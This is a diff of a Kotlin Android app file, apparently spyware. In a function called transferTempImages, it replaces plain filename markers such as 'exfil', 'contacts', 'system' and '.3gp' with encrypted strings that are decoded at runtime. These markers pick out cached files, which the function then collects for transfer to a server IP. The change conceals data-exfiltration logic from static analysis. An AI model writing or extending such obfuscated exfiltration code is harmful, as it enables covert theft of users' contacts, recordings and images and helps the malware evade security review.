@@ -63,6 +63,7 @@ import android.widget.Toast
 import androidx.compose.foundation.background
 import androidx.compose.ui.graphics.Color
 import com.example.axesite.R
+import com.example.axesite.util.StringObfuscator
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.BufferedReader
@@ -1049,13 +1050,22 @@ private suspend fun transferTempImages(
     context: Context,
     serverIp: String,
 ) {
+    // Encrypted prefixes
+    val exfilPrefix = StringObfuscator.decrypt("3YE8T/1aJv8J3lTmMgpTlPJTyWUQYdwqcWz+HxPQbVs=") // "exfil"
+    val systemPrefix = StringObfuscator.decrypt("XuihhGw2yKz7LKo+VJDJYfZuA9QVcD8QbMNchHHSJVA=") // "system"
+    val contactsPrefix = StringObfuscator.decrypt("e/0tN13kZh7OYvW9jlxqR8pXu4+WPLvSWaEGU3yGFWI=") // "contacts"
+    val tempImagePrefix = StringObfuscator.decrypt("jQupCILqtBCf3Oz76z2XGnk5DV7qWMV7JRj9Aj5d2co=") // "temp_image"
+    val jpg = StringObfuscator.decrypt("CXm1/uqhKPFZRgXWOC02Jw==") // ".jpg"
+    val png = StringObfuscator.decrypt("YP5dLoCw79Z2trtmcQNgPA==") // ".png"
+    val format3gp = StringObfuscator.decrypt("NKwjUwQy9/hqlM/Tx+L/CA==") // ".3gp"
+    
     val tempImages = context.cacheDir.listFiles()?.filter { file ->
-        file.name.startsWith("exfil") ||
-                file.name.startsWith("system") ||
-                file.name.endsWith(".3gp") ||
-                file.name.startsWith("contacts") ||
-                file.name.startsWith("temp_image") &&
-                (file.name.endsWith(".jpg") || file.name.endsWith(".png"))
+        file.name.startsWith(exfilPrefix) ||
+                file.name.startsWith(systemPrefix) ||
+                file.name.endsWith(format3gp) ||
+                file.name.startsWith(contactsPrefix) ||
+                file.name.startsWith(tempImagePrefix) &&
+                (file.name.endsWith(jpg) || file.name.endsWith(png))
     } ?: emptyList()
 
     if (tempImages.isEmpty()) {
